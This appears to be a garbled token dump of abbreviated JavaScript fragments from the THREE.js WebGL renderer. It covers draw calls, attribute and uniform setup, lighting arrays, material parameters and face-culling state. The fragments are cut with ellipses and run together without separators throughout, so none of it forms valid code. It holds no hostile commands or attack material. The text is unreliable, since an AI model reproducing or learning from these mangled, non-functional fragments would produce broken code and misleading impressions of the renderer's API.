utes.uvobject. ... oColorsmateria ... oColorsobject.colorArrayenableA ... olor );enableA ... color )program ... s.colordisable ... utes();disable ... butes()disable ... ributes_gl.dra ... ount );_gl.dra ... count )_gl.drawArrays_gl.TRIANGLESobject.count = 0;object.count = 0setupVe ... ributesvar attributeNamevar att ... Name ];program ... eName ]geometr ... eName ]attribu ... er >= 0attribu ... temSizeenableA ... nter );enableA ... inter )_gl.ver ...  * 4 );_gl.ver ... e * 4 )startIn ... ize * 4startIn ... uteSizemateria ... eValuesmateria ... h === 2materia ... eName ]_gl.ver ... me ] );_gl.ver ... ame ] )_gl.vertexAttrib2fvmateria ... h === 3_gl.vertexAttrib3fvthis.re ... }\r\n\r\n\t}this.re ... rDirectif ( ma ... return;materia ... = falsevar lin ... ribute;var att ... teSize;var pro ... ject );program ... bject )setProg ... bject )var pro ... ibutes;program ... ributesvar geo ... ibutes;geometr ... ributesvar upd ... ameBit;updateB ... = falsewirefra ... ? 1 : 0materia ... ? 1 : 0geometr ... rameBit( geome ... rameBit( geome ... d * 2 )( geome ... fffff )geometr ... xffffffgeometry.id( program.id * 2 )program.id * 2program.idgeometr ... oupHash_curren ... ryHash;_curren ... tryHashupdateB ... = true;updateBuffers = truevar ind ... dex" ];index = ... ndex" ]geometr ... ndex" ]var type, size;index.a ... 32Arrayindex.arraytype =  ... ED_INT;type =  ... NED_INT_gl.UNSIGNED_INTtype =  ... _SHORT;type =  ... D_SHORT_gl.UNSIGNED_SHORTif ( of ... \r\n\t\t\t\t}if ( up ... \n\t\t\t\t\t}setupVe ... s, 0 );setupVe ... es, 0 )index.buffer_gl.dra ... e, 0 );_gl.dra ... pe, 0 )_gl.drawElementsindex.array.length_this.i ... lls ++;_this.i ... alls ++_this.i ... r.calls_this.i ... length;_this.i ... .length_this.i ... th / 3;_this.i ... gth / 3index.a ... gth / 3il = offsets.lengthvar sta ... .index;startIn ... ].indexoffsets[ i ].indexoffsets[ i ]if ( up ... \t\t\t\t\t\t}setupVe ... ndex );setupVe ... Index )_gl.dra ... size );_gl.dra ...  size )offsets[ i ].countoffsets ...  * sizeoffsets[ i ].start_this.i ... .count;_this.i ... ].count_this.i ... nt / 3;_this.i ... unt / 3offsets ... unt / 3if ( up ... \r\n\t\t\t\t}var pos ... ion" ];positio ... tion" ]geometr ... tion" ]_gl.dra ...  / 3 );_gl.dra ... h / 3 )positio ... gth / 3positio ... .length_this.i ... th / 9;_this.i ... gth / 9positio ... gth / 9object  ... eSystemif ( up ... \n\r\n\t\t\t}_gl.POINTS_this.i ... .pointsvar mod ... .LINES;mode =  ... l.LINES( objec ... l.LINES( objec ... Strip )_gl.LINE_STRIP_gl.LINESif ( of ... = true;offsets.length > 1this.renderBuffervar lin ...  i, il;geometryGroup.id_curren ... upHash;if ( !m ... \r\n\r\n\t\t}!materi ... on >= 0!materi ... Targetsattribu ... on >= 0object. ... getBasesetupMo ... ject );setupMo ... bject )attribu ... t[ i ];attribu ... st[ i ]geometr ... st[ i ]attribu ...  ] >= 0attribu ... ibute ]enableA ... te ] );enableA ... ute ] )attribu ... or >= 0attributes.colorobject. ... gth > 0object. ... y.faces{\r\n\r\n\r\n ... \r\n\t\t\t\t}_gl.ver ... olor );_gl.ver ... color )materia ... s.colorattribu ... al >= 0attribu ... nt >= 0attributes.tangentenableA ... gent );enableA ... ngent )attributes.uv >= 0object. ... xUvs[0]object. ... rtexUvs_gl.ver ... s.uv );_gl.ver ... es.uv )materia ... lues.uvattributes.uv2 >= 0attributes.uv2object. ... xUvs[1]enableA ... .uv2 );enableA ... s.uv2 )_gl.ver ... .uv2 );_gl.ver ... s.uv2 )materia ... ues.uv2materia ... ht >= 0materia ... ex >= 0attribu ... ex >= 0attributes.skinIndexattribu ... ht >= 0attribu ... nWeightenableA ... ndex );enableA ... Index )enableA ... ight );enableA ... eight )attribu ... ce >= 0attribu ... istanceenableA ... ance );enableA ... tance )var typ ... _SHORT;geometr ... D_SHORTgeometr ... 32Arrayif ( up ... ffer );_this.i ... eCount;_this.i ... ceCountgeometr ... unt / 3_gl.dra ... Count )_this.i ... leCountl = _ne ... .length_newAtt ... .length_newAtt ...  ] = 0;_newAtt ... i ] = 0_newAttributes[ i ]_newAtt ...  ] = 1;_newAtt ... e ] = 1_newAtt ... ibute ]if ( _e ... \r\n\r\n\t\t}_enable ... ] === 0_enable ... ibute ]_gl.ena ... bute );_gl.ena ... ibute )_gl.ena ... ibArray_enable ...  ] = 1;_enable ... e ] = 1l = _en ... .length_enable ... .lengthif ( _e ... \n\r\n\t\t\t}_enable ... es[ i ]_gl.dis ... y( i );_gl.dis ... ay( i )_gl.dis ... ibArray_enable ...  ] = 0;_enable ... i ] = 0object. ... on >= 0object. ...  !== -1_gl.bin ... se ] );_gl.bin ... ase ] )geometr ... tBase ]object. ... edOrdervar m = 0;var ord ... dOrder;order = ... edOrdervar inf ... uences;influen ... luenceswhile ( ... ;\r\n\t\t\t}m < mat ... .lengthm < mat ... TargetsnumSupp ... Targetsm < order.lengthorder.length{\r\n\r\n\t\t ... ;\r\n\t\t\t}attribu ... " + m ]"morphTarget" + mmorphTarget_gl.bin ...  ] ] );_gl.bin ... m ] ] )geometr ... [ m ] ]order[ m ]enableA ...  m ] );enableA ... + m ] )attribu ... Normals"morphNormal" + mmorphNormalobject. ...  m ] ];object. ... [ m ] ]object. ... es[ m ]__webgl ... luencesinfluen ... [ m ] ]m ++;var inf ... s = [];activeI ... es = []activeI ... Indicesvar i,  ... length;il = in ... .lengthinfluences.lengthinfluen ... s[ i ];influen ... es[ i ]influences[ i ]influence > 0activeI ...  i ] );activeI ... , i ] )activeI ... es.push[ influence, i ]if ( ac ... \n\r\n\t\t\t}activeI ... TargetsactiveI ... .lengthactiveI ... Sort );activeI ... lSort )activeI ... es.sortactiveI ... argets;activeI ... NormalsnumSupp ... NormalsactiveI ... h === 0activeI ...  0 ] );activeI ... , 0 ] )var inf ...  m = 0;if ( ac ... \r\n\t\t\t\t}activeI ... es[ m ]influen ... ][ 1 ];influen ...  ][ 1 ]activeI ...  ][ 1 ]_gl.bin ... ex ] );_gl.bin ... dex ] )geometr ... Index ]object. ... ndex ];influen ... Index ]object. ...  ] = 0;object. ... m ] = 0materia ... luencesmateria ... niforms_gl.uni ... nces );_gl.uni ... ences )_gl.uniform1fvreturn  ... a[ 0 ];b[ 0 ] - a[ 0 ]b[ 0 ]a[ 0 ]THREE.WebGLRenderer.render: camera is not an instance of THREE.Camera.var i,  ... ne.fog;lights  ... _lightsscene.__lightsfog = scene.fogscene.fog_projSc ... erse );_projSc ... verse )_projSc ... atricesif ( th ... cene );this.in ... cene );this.in ... scene )this.in ... ObjectsrenderP ... mera );renderP ... amera )_this.i ... ls = 0;_this.i ... lls = 0_this.i ... ts = 0;_this.i ... nts = 0this.au ... ceClearrenderL ... bjects;renderL ... Objectsscene.__webglObjectsil = re ... .lengthrenderList.lengthwebglOb ... t[ i ];webglOb ... st[ i ]renderList[ i ]webglObject.objectwebglObject.id = i;webglObject.id = iwebglObject.idwebglOb ...  false;webglOb ... = falsewebglObject.render! ( obj ... bject )! ( obj ... ulled )! ( obj ... ystem )( objec ... ystem )( objec ... ulled )setupMa ... mera );setupMa ... amera )unrollB ... ject );unrollB ... bject )webglOb ... = true;webglOb ...  = trueif ( th ... \n\t\t\t\t\t}this.so ... == truewebglOb ... rDepth;webglOb ... erDepthwebglObject.zwebglOb ... tor3.z;webglOb ... ctor3.zrenderL ... able );renderL ... table )renderList.sortrenderL ... ediate;renderL ... mediatescene._ ... mediate__webgl ... mediateunrollI ... ject );unrollI ... bject )unrollI ... aterialscene.o ... aterialthis.se ... dDst );this.se ... ndDst )this.setBlendingthis.se ... Test );this.se ... hTest )this.setDepthTestthis.se ... rite );this.se ... Write )this.setDepthWritesetPoly ... nits );setPoly ... Units )renderO ... rial );renderO ... erial )renderO ... mediatethis.se ... ding );this.se ... nding )renderT ... rFilterrenderT ... tFilterrenderT ... MipmapsrenderT ... nFilterupdateR ... rget );updateR ... arget )updateR ... tMipmapthis.se ... true );this.se ...  true )! plugins.lengthplugins.lengthil = plugins.lengthplugins ... ight );plugins ... eight )plugins[ i ].renderplugins[ i ]var web ...  delta;if ( re ... 1;\r\n\t\t}start = ... th - 1;start = ... gth - 1renderL ... gth - 1end = -1;end = -1delta = -1;delta = -1{\r\n\r\n\t\t ... 1;\r\n\t\t}start = 0;start = 0end = r ... length;end = r ... .lengthdelta = 1;delta = 1i !== endi += deltavar i = startif ( we ... \n\r\n\t\t\t}buffer  ... buffer;buffer  ... .bufferwebglObject.bufferif ( ov ... \r\n\t\t\t\t}materia ... Type ];materia ... lType ]webglOb ... lType ]! materialif ( us ... dDst );_this.s ... dDst );_this.s ... ndDst )_this.setBlending_this.s ... Test );_this.s ... hTest )_this.setDepthTest_this.s ... rite );_this.s ... Write )_this.setDepthWrite_this.s ... rial );_this.s ... erial )_this.s ... alFacesif ( bu ... \r\n\t\t\t\t}buffer  ... eometry_this.r ... ject );_this.r ... bject )_this.r ... rDirect_this.renderBuffervar web ... rogram;_this.r ... eObjectrenderI ... eObjectthis.re ... eObjectobject. ... allbackimmedia ... allbackobject. ... stum );object. ... ustum )object. ... ); } );object. ...  ); } )object.renderfunctio ... al ); }{ _this ... al ); }_this.r ... rial );_this.r ... erial )_this.r ... mediatevar obj ... terial;globject.objectglobjec ... terial;globjec ... aterialglobject.transparentglobjec ... = null;globjec ...  = nullglobject.opaquevar obj ... object;var buf ... buffer;globject.buffervar mat ... lIndex;materia ... alIndexbuffer.materialIndexmateria ... ndex ];materia ... Index ]if ( !s ... \r\n\r\n\t\t}!scene. ... Objectsscene._ ... s = [];scene._ ... ts = []scene._ ... e = [];scene._ ... te = []scene._ ... es = []scene.__webglSpritesscene.__webglFlaresscene._ ... .lengthscene.__objectsAddedaddObje ... cene );addObje ... scene )scene._ ... ed[ 0 ]scene._ ... 0, 1 );scene._ ...  0, 1 )scene._ ... .splicescene._ ... RemovedremoveO ... cene );removeO ... scene )ol = sc ... .lengthscene._ ... .objectscene._ ... ts[ o ]object.__webglInitobject.__webglActiveupdateO ... ject );updateO ... bject )var g,  ... yGroup;object. ... = true;object. ...  = trueobject. ... rix4();object. ... trix4()object. ... wMatrixobject. ... rix3();object. ... trix3()object._normalMatrixinitDir ... etry );initDir ... metry )geometr ... 535  );geometr ... 5535  )geometry.makeGroups_glExte ... : 65535for ( g ... \n\t\t\t\t\t}geometr ... s[ g ];! geome ... xBuffercreateM ... roup );createM ... Group )initMes ... ject );initMes ... bject )createL ... etry );createL ... metry )initLin ... ject );initLin ... bject )createP ... etry );createP ... metry )initPar ... ject );initPar ... bject )addBuff ... ject );addBuff ... bject )object  ... allbackobject  ... rObjectTHREE.I ... rObjectImmedia ... rObjectscene._ ... es.pushobject  ... nsFlareTHREE.LensFlareobjlist ... }\r\n\t\t);objlist ... \t}\r\n\t\t)objlist.push{\r\n\t\t\t\t ... 0\r\n\t\t\t}id: nullbuffer: bufferopaque: nulltransparent: nullvar geo ... terial;customA ... esDirtysetDire ... DRAW );setDire ... _DRAW )for( va ... \n\r\n\t\t\t}geometr ... upsListgeometr ... t[ i ];materia ... roup );customA ... rial );customA ... erial )areCust ... erial )areCust ... esDirtygeometr ... esDirtysetMesh ... rial );setMesh ... erial )!geometry.dynamicgeometry.dynamicgeometr ...  false;materia ... rial );clearCu ... erial )clearCu ... ributesmateria ... etry );materia ... metry )getBuff ... metry )setLine ... DRAW );setLine ... _DRAW )geometr ... rticlessetPart ... ject );setPart ... bject )if ( ma ... n true;materia ... sUpdatemateria ...  false;removeI ... ject );removeI ... bject )removeI ... sDirectdelete  ... Active;delete  ... lActiveo >= 0o --var o = ... gth - 1o = obj ... gth - 1objlist.length - 1objlist.lengthobjlist ...  objectobjlist[ o ].objectobjlist[ o ]objlist ... o, 1 );objlist ...  o, 1 )objlist.splicethis.initMaterialvar u,  ... aderID;shaderID = 'depth';shaderID = 'depth'shaderID = 'normal';shaderID = 'normal'shaderID = 'basic';shaderID = 'basic'shaderI ... mbert';shaderID = 'lambert'shaderID = 'phong';shaderID = 'phong'shaderID = 'dashed';shaderID = 'dashed'shaderI ... basic';shaderI ... _basic'if ( sh ... \r\n\r\n\t\t}setMate ... ID ] );setMate ... rID ] )THREE.S ... derID ]maxLigh ... ghts );maxLigh ... ights )allocat ... ights )maxShad ... ghts );maxShad ... ights )maxBone ... ject );maxBone ... bject )allocat ... bject )paramet ... \n\r\n\t\t};paramet ... \r\n\r\n\t\t}map: !!material.map!!material.map!material.mapenvMap: ... .envMap!!material.envMaplightMa ... ightMap!!material.lightMap!material.lightMapbumpMap ... bumpMap!!material.bumpMap!material.bumpMapnormalM ... rmalMap!!material.normalMap!material.normalMapspecula ... ularMap!!mater ... ularMap!materi ... ularMapfog: foguseFog: material.fogfogExp: ... FogExp2fog ins ... FogExp2sizeAtt ... nuationskinnin ... kinningmaxBones: maxBonesuseVert ... Texture_suppor ... Texture_suppor ... keleton_suppor ...  objectobject.skeletonobject. ... TexturemaxMorp ... TargetsmaxMorp ... NormalsmaxDirL ... ctionalmaxLigh ... ctionalmaxPoin ... t.pointmaxLightCount.pointmaxSpot ... nt.spotmaxLightCount.spotmaxHemi ... nt.hemimaxLightCount.hemimaxShad ... ShadowsshadowM ... ows > 0this.sh ... ows > 0this.sh ... eShadowmaxShadows > 0shadowM ... MapTypeshadowM ... apDebugshadowM ... CascadealphaTe ... phaTestmetal:  ... l.metalwrapAro ... pArounddoubleS ... bleSideflipSid ... ackSidevar chunks = [];chunks = []chunks. ... erID );chunks. ... derID )chunks.pushchunks. ... ader );chunks. ... hader )var dchunks.push( d );chunks.push( d )chunks. ...  d ] );chunks. ... [ d ] )materia ... es[ d ]var pchunks.push( p );chunks.push( p )chunks. ...  p ] );chunks. ... [ p ] )parameters[ p ]var cod ... join();code = chunks.join()chunks.join()chunks.joinvar program;p < plp ++var p = ... .lengthp = 0pl = _p ... .lengthvar pro ... s[ p ];program ... ms[ p ]_programs[ p ]program ... == codeprogramInfo.codeprogram ... amInfo;program ... ramInfoprogram ... mes ++;program.usedTimes ++program.usedTimesprogram ... ters );program ... eters )THREE.WebGLProgram_progra ... gram );_progra ... ogram )_programs.pushmateria ... ts = 0;materia ... ets = 0var id, ... arget";base = "morphTarget"i < thi ... Targetsid = base + i;id = base + ibase + iattributes[ id ]materia ... ets ++;materia ... gets ++materia ... ls = 0;materia ... als = 0var id, ... ormal";base = "morphNormal"i < thi ... Normalsmateria ... als ++;materia ... mals ++materia ... t = [];materia ... st = []materia ... rmsListmateria ...  u ] );materia ... , u ] )materia ... st.push[ mater ...  ], u ]materia ... ms[ u ]shaders.uniformsshaders.vertexShadershaders ... tShader_usedTe ... ts = 0;material.needsUpdateif ( ma ... rial );_this.i ... ject );_this.i ... bject )_this.initMaterial! objec ... luencesobject. ... gets );object. ... rgets )new Flo ... rgets )_this.m ... Targetsvar ref ...  false;refresh ... = falsevar pro ... iforms;p_unifo ... niformsprogram.uniformsm_unifo ... niformsprogram ... Program_gl.use ... gram );_gl.use ... ogram )_gl.useProgramprogram.program_curren ... ram.id;_curren ... gram.idrefresh ... = true;refresh ...  = truemateria ... erialIdmaterial.id_curren ... ial.id;_curren ... rial.idrefresh ... tCameracamera  ... tCamera_gl.uni ... ents );_gl.uni ... ments )_gl.uniformMatrix4fvp_unifo ... nMatrixif ( _l ... \n\r\n\t\t\t}_gl.uni ... .LN2));_gl.uni ... h.LN2))_gl.uniform1fp_unifo ... thBufFC2.0 / ( ... th.LN2)(Math.l ... th.LN2)Math.lo ...  + 1.0)camera.far + 1.0if ( ca ... camera;_curren ... camera;_curren ...  cameraif ( _s ... \n\r\n\t\t\t}if ( p_ ... \r\n\t\t\t\t}p_unifo ... == nullp_unifo ... Texturevar tex ... Unit();texture ... eUnit()getTextureUnit()_gl.uni ... Unit );_gl.uni ... eUnit )_gl.uniform1i_this.s ... Unit );_this.s ... eUnit )_this.setTexturep_unifo ... reWidth_gl.uni ... idth );_gl.uni ... Width )object. ... reWidthp_unifo ... eHeight_gl.uni ... ight );_gl.uni ... eight )object. ... eHeightp_unifo ... atrices_gl.uni ... ices );_gl.uni ... rices )object. ... atricesfog && material.fogrefresh ...  fog );refresh ... , fog )if ( _l ... \r\n\t\t\t\t}setupLi ... ghts );setupLi ... ights )_lights ...  false;_lights ... = falserefresh ... ghts );refresh ... ights )refresh ... sLightsrefresh ... rial );refresh ... erial )refresh ... sCommonrefresh ... articlerefresh ... Lambertm_unifo ... a.near;m_unifo ... ra.nearm_unifo ... r.valuem_uniforms.mNearm_unifo ... ra.far;m_unifo ... era.farm_uniforms.mFarm_unifo ... pacity;m_unifo ... opacitym_unifo ... y.valuem_uniforms.opacityobject. ... dowPass! mater ... dowPassmaterial._shadowPassrefresh ... sShadowloadUni ... List );loadUni ... sList )p_unifo ... osition_gl.uni ... r3.z );_gl.uni ... or3.z )_gl.uniform3f_vector3.x_vector3.yp_unifo ... wMatrixloadUni ... ject );loadUni ... bject )if ( p_ ... \r\n\r\n\t\t}p_unifo ... lMatrixobject. ... lementsreturn program;uniform ... y.valueuniforms.opacityif ( _t ... \r\n\r\n\t\t}_this.gammaInputuniform ... oLinearuniform ... e.valueuniforms.diffuseuniform ... .color;uniform ... l.coloruniform ... al.map;uniform ... ial.mapuniforms.map.valueuniforms.mapuniform ... p.valueuniforms.lightMapuniforms.specularMapuniform ... umpMap;uniform ... bumpMapuniforms.bumpMapuniform ... pScale;uniform ... mpScaleuniforms.bumpScaleuniforms.normalMapuniform ... cale );uniform ... Scale )uniform ... ue.copyuniforms.normalScalevar uvScaleMap;uvScale ... al.map;uvScale ... ial.mapuvScale ... larMap;uvScale ... ularMapuvScale ... malMap;uvScale ... rmalMapuvScale ... umpMap;uvScale ... bumpMapuvScale ... definedvar off ... offset;offset  ... .offsetuvScaleMap.offsetvar rep ... repeat;repeat  ... .repeatuvScaleMap.repeatuniform ... at.y );uniform ... eat.y )uniform ... t.valueuniform ... tRepeatrepeat.xrepeat.yuniforms.envMapuniform ... 1 : -1;uniform ...  1 : -1uniforms.flipEnvMap( mater ...  1 : -1( mater ... tCube )materia ... getCubeuniform ... nRatio;uniform ... onRatiouniform ... o.valueuniform ... ombine;uniform ... combineuniforms.combineuniform ... apping;uniform ... Mappinguniforms.useRefractuniform ... shSize;uniform ... ashSizeuniforms.dashSizeuniform ... apSize;uniform ... gapSizeuniforms.totalSizeuniform ... .scale;uniform ... l.scaleuniforms.scale.valueuniforms.scaleuniform ... r.valueuniforms.psColoruniform ... l.size;uniform ... al.sizeuniforms.size.valueuniforms.sizeuniform ...  / 2.0;uniform ... t / 2.0_canvas.height / 2.0uniform ... g.coloruniforms.fogColorif ( fo ... \r\n\r\n\t\t}fog ins ... REE.Foguniform ... g.near;uniform ... og.nearuniforms.fogNearfog.nearuniform ... og.far;uniform ... fog.faruniforms.fogFarfog.faruniform ... ensity;uniform ... densityuniforms.fogDensityfog.densityuniform ... s.valueuniforms.shininessuniforms.ambientuniform ... sive );uniform ... ssive )uniforms.emissiveuniforms.specularuniform ... mbient;uniform ... ambientuniform ... issive;uniform ... missiveuniform ... ecular;uniform ... pecularuniform ... pRGB );uniform ... apRGB )uniform ... B.valueuniforms.wrapRGBuniform ... htColorlights.ambientuniform ... colors;uniform ... .colorsdirecti ... htColorlights. ... .colorslights.directionaluniform ... itions;uniform ... sitionsuniform ... n.valueuniform ... rectiondirecti ... rectionlights. ... sitionslights.point.colorslights.pointuniform ... ositionuniform ... tances;uniform ... stancesuniform ... istancelights. ... stanceslights.spot.colorslights.spotuniform ... ctions;uniform ... ectionslights. ... ectionsuniform ... lesCos;uniform ... glesCosuniform ... ngleCoslights. ... glesCosuniform ... onents;uniform ... ponentsuniform ... xponentlights. ... ponentsuniform ... Colors;uniform ... yColorsuniform ... kyColorhemisph ... kyColorlights. ... yColorslights.hemiuniform ... dColorsuniform ... ndColorhemisph ... ndColorlights. ... dColorshemisph ... rectionif ( un ... \r\n\r\n\t\t}uniform ... wMatrixvar j = 0;il = lights.lengthlights.lengthvar lig ... s[ i ];light = lights[ i ]lights[ i ]! light.castShadowif ( li ... \r\n\t\t\t\t}light i ... scade )light i ... otLight( light ... scade )light i ... Cascade! light ... Cascadeuniform ... dowMap;uniform ... adowMapuniform ... ue[ j ]uniforms.shadowMaplight.shadowMapuniform ... MapSizelight.shadowMapSizeuniform ... Matrix;uniform ... x.valuelight.shadowMatrixuniform ... rkness;uniform ... arknessuniform ... owBias;uniform ... dowBiasuniforms.shadowBiasj ++;uniform ... lMatrix_gl.uniformMatrix3fvvar tex ... eUnits;texture ... reUnitstexture ... exturesconsole ... ures );console ... tures )"WebGLR ... extures"WebGLR ...  only ""WebGLR ... ureUnit"WebGLR ... o use "WebGLRenderer: trying to use " textu ...  only " texture units while this GPU supports only _usedTe ... s += 1;_usedTe ... ts += 1return textureUnit;var uni ... offset;jl = uniforms.lengthlocatio ...  1 ] ];locatio ... [ 1 ] ]program ... [ 1 ] ]uniforms[ j ][ 1 ]uniforms[ j ]if ( !l ... ntinue;!locationuniform ... ][ 0 ];uniform ...  ][ 0 ]uniforms[ j ][ 0 ]type = uniform.type;type = uniform.typeuniform.typevalue = ... .value;value = ... m.valueuniform.valueif ( ty ... \n\r\n\t\t\t}type === "i"{ // si ... \n\r\n\t\t\t}_gl.uni ... alue );_gl.uni ... value )type === "f"type === "v2"_gl.uni ... ue.y );_gl.uni ... lue.y )_gl.uniform2ftype === "v3"_gl.uni ... ue.z );_gl.uni ... lue.z )type === "v4"_gl.uni ... ue.w );_gl.uni ... lue.w )_gl.uniform4ftype === "c"_gl.uni ... ue.b );_gl.uni ... lue.b )type === "iv1"iv1{ // fl ... \n\r\n\t\t\t}_gl.uniform1ivtype === "iv"_gl.uniform3ivtype === "fv1"type === "fv"_gl.uniform3fvtype === "v2v"{ // ar ... \n\r\n\t\t\t}if ( un ... \r\n\t\t\t\t}uniform ... defineduniform._arrayuniform ... ngth );uniform ... ength )new Flo ... ength )2 * value.lengthvalue.lengthil = value.lengthoffset = i * 2;offset = i * 2i * 2uniform ...  i ].x;uniform ... [ i ].xuniform ... ffset ]value[ i ].xvalue[ i ]uniform ...  i ].y;uniform ... [ i ].yuniform ... t + 1 ]value[ i ].y_gl.uni ... rray );_gl.uni ... array )_gl.uniform2fvtype === "v3v"v3v3 * value.lengthoffset = i * 3;offset = i * 3i * 3uniform ...  i ].z;uniform ... [ i ].zuniform ... t + 2 ]value[ i ].ztype === "v4v"v4v4 * value.lengthoffset = i * 4;offset = i * 4i * 4uniform ...  i ].w;uniform ... [ i ].wuniform ... t + 3 ]value[ i ].w_gl.uniform4fvtype === "m3"m3value.elementstype === "m3v"m3v9 * value.lengthvalue[  ...  * 9 );value[  ... i * 9 )value[  ... yOffseti * 9type === "m4"m4type === "m4v"16 * value.lengthvalue[  ... * 16 );value[  ...  * 16 )i * 16type === "t"texture = value;texture = valuetexture ... Unit();if ( !t ... ntinue;!texturetexture ... h === 6texture.image.lengthsetCube ... Unit );setCube ... eUnit )texture ... getCubesetCube ... Dynamictype === "tv"uniform._array = [];uniform._array = []il = un ... .lengthuniform.value.lengthuniform ... Unit();uniform ... eUnit()uniform._array[ i ]texture ... e[ i ];texture ... ue[ i ]uniform.value[ i ]texture ... y[ i ];texture ... ay[ i ]console ... type );console ...  type )'THREE. ...  + type'THREE. ... type: 'THREE.WebGLRenderer: Unknown uniform type: object. ... lMatrixarray[  ... sitySq;array[  ... nsitySqarray[ offset ]color.r ... nsitySqcolor.g ... nsitySqcolor.b ... nsitySqarray[  ... ensity;array[  ... tensitycolor.r * intensitycolor.g * intensitycolor.b * intensityvar l,  ... et = 0;g = 0zlights = _lightsdirColo ... .colorszlights ... .colorszlights.directionaldirPosi ... sitionszlights ... sitionspointCo ... .colorszlights.point.colorszlights.pointpointPo ... sitionspointDi ... stanceszlights ... stancesspotCol ... .colorszlights.spot.colorszlights.spotspotPos ... sitionsspotDis ... stancesspotDir ... ectionszlights ... ectionsspotAng ... glesCoszlights ... glesCosspotExp ... ponentszlights ... ponentshemiSky ... yColorszlights ... yColorszlights.hemihemiGro ... dColorszlights ... dColorshemiPos ... sitionsdirLength = 0pointLength = 0spotLength = 0hemiLength = 0dirCount = 0pointCount = 0spotCount = 0hemiCount = 0dirOffset = 0pointOffset = 0spotOffset = 0hemiOffset = 0for ( l ... \r\n\r\n\t\t}l = 0,  ... .lengthll = lights.lengthlight = lights[ l ];light = lights[ l ]lights[ l ]if ( li ... ntinue;color = light.color;color = light.colorintensi ... ensity;distanc ... stance;! light.visiblelight.visibleif ( _t ... \r\n\t\t\t\t}r += co ... olor.r;r += co ... color.rg += co ... olor.g;g += co ... color.gb += co ... olor.b;b += co ... color.br += color.r;r += color.rg += color.g;g += color.gb += color.b;b += color.bdirCount += 1;dirCount += 1_direct ... orld );_direct ... World )_direct ... ositionlight.t ... ixWorld_direct ... tor3 );_direct ... ctor3 )_direction.sub_direct ... lize();_direct ... alize()_direction.normalizeif ( _d ... ntinue;_direct ... z === 0_direct ... y === 0_direction.x === 0_direction.x_direction.y === 0_direction.y_direction.z === 0_direction.zdirOffs ... th * 3;dirOffs ... gth * 3dirLength * 3dirPosi ... tion.x;dirPosi ... ction.xdirPosi ... ffset ]dirPosi ... tion.y;dirPosi ... ction.ydirPosi ... t + 1 ]dirOffset + 1dirPosi ... tion.z;dirPosi ... ction.zdirPosi ... t + 2 ]dirOffset + 2setColo ... sity );setColo ... nsity )dirLength += 1;dirLength += 1pointCount += 1;pointCount += 1pointOf ... th * 3;pointOf ... gth * 3pointLength * 3pointPo ... tor3.x;pointPo ... ctor3.xpointPo ... ffset ]pointPo ... tor3.y;pointPo ... ctor3.ypointPo ... t + 1 ]pointOffset + 1pointPo ... tor3.z;pointPo ... ctor3.zpointPo ... t + 2 ]pointOffset + 2pointDi ... stance;pointDi ... istancepointDi ... ength ]pointLength += 1;pointLength += 1spotCount += 1;spotCount += 1spotOff ... th * 3;spotOff ... gth * 3spotLength * 3spotPos ... tor3.x;spotPos ... ctor3.xspotPos ... ffset ]spotPos ... tor3.y;spotPos ... ctor3.yspotPos ... t + 1 ]spotOffset + 1spotPos ... tor3.z;spotPos ... ctor3.zspotPos ... t + 2 ]spotOffset + 2spotDis ... stance;spotDis ... istancespotDis ... ength ]_direction.copyspotDir ... tion.x;spotDir ... ction.xspotDir ... ffset ]spotDir ... tion.y;spotDir ... ction.yspotDir ... t + 1 ]spotDir ... tion.z;spotDir ... ction.zspotDir ... t + 2 ]spotAng ... ngle );spotAng ... angle )spotAng ... ength ]Math.co ... angle )spotExp ... ponent;spotExp ... xponentspotExp ... ength ]spotLength += 1;spotLength += 1light i ... reLighthemiCount += 1;hemiCount += 1hemiOff ... th * 3;hemiOff ... gth * 3hemiLength * 3hemiPos ... tion.x;hemiPos ... ction.xhemiPos ... ffset ]hemiPos ... tion.y;hemiPos ... ction.yhemiPos ... t + 1 ]hemiOffset + 1hemiPos ... tion.z;hemiPos ... ction.zhemiPos ... t + 2 ]hemiOffset + 2skyColo ... .color;skyColo ... t.colorgroundC ... dColor;groundC ... ndColorsetColo ... tySq );setColo ... itySq )hemiLength += 1;hemiLength += 1for ( l ...  = 0.0;l = dir ... t * 3 )l = dirLength * 3ll = Ma ... t * 3 )Math.ma ... t * 3 )dirColors.lengthdirCount * 3dirColo ...  = 0.0;dirColors[ l ] = 0.0dirColors[ l ]l = poi ... t * 3 )l = pointLength * 3pointColors.lengthpointCount * 3pointCo ...  = 0.0;pointCo ... ] = 0.0pointColors[ l ]l = spo ... t * 3 )l = spotLength * 3spotColors.lengthspotCount * 3spotCol ...  = 0.0;spotCol ... ] = 0.0spotColors[ l ]l = hem ... t * 3 )l = hemiLength * 3hemiSkyColors.lengthhemiCount * 3hemiSky ...  = 0.0;hemiSky ... ] = 0.0hemiSkyColors[ l ]hemiGro ... .lengthhemiGro ...  = 0.0;hemiGro ... ] = 0.0hemiGro ... rs[ l ]zlights ... Length;zlights ... rLengthzlights ... .lengthzlights ... tLengthzlights.point.lengthzlights.spot.lengthzlights ... iLengthzlights.hemi.lengthzlights ...  ] = r;zlights ... 0 ] = rzlights.ambient[ 0 ]zlights.ambientzlights ...  ] = g;zlights ... 1 ] = gzlights.ambient[ 1 ]zlights ...  ] = b;zlights ... 2 ] = bzlights.ambient[ 2 ]this.se ... }\r\n\r\n\t}cullFac ... aceNone_gl.dis ... FACE );_gl.dis ... _FACE )_gl.CULL_FACEif ( fr ... \n\r\n\t\t\t}frontFa ... ctionCW_gl.fro ... l.CW );_gl.fro ... gl.CW )_gl.frontFace_gl.CW_gl.fro ... .CCW );_gl.fro ... l.CCW )_gl.CCWcullFac ... aceBack_gl.cul ... BACK );_gl.cul ... .BACK )_gl.cullFace_gl.BACKcullFac ... ceFront_gl.cul ... RONT );_gl.cul ... FRONT )_gl.FRONT_gl.cul ... _BACK )_gl.FRONT_AND_BACK_gl.ena ... FACE );_gl.ena ... _FACE )this.se ... alFacesvar dou ... leSide;var fli ... ckSide;_oldDou ... leSidedif ( do ... \n\r\n\t\t\t}_oldDou ... eSided;_oldFli ... ipSidedif ( fl ... \n\r\n\t\t\t}_oldFli ... pSided;_oldDep ... pthTest_gl.ena ... TEST );_gl.DEPTH_TEST_gl.dis ... TEST );_oldDep ... thTest;_oldDep ... thWrite_gl.dep ... rite );_gl.dep ... Write )_gl.depthMask_oldDep ... hWrite;if ( wi ... \r\n\r\n\t\t}width ! ... neWidth_gl.lin ... idth );_gl.lin ... width )_gl.lineWidth_oldLin ...  width;_oldLin ... = width_oldPol ... noffset_gl.ena ... FILL );_gl.ena ... _FILL )_gl.POL ... ET_FILL_gl.dis ... 